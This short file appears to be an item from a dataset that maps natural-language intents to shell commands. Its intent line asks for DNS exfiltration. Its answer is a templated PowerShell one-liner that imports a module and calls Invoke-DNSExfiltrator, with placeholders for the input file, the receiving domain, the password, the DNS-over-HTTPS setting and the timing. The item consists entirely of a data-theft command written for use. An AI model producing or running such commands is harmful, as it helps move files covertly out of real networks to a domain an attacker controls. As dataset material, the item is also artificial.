# Natural language intent:
# Import a PowerShell module and use DNS exfiltration with specified parameters.

Import-Module ${PSmodule} ; Invoke-DNSExfiltrator -i ${PSmodule} -d ${Domain} -p ${pwd} -doh ${DOH} -t ${Time} ${Encoding}
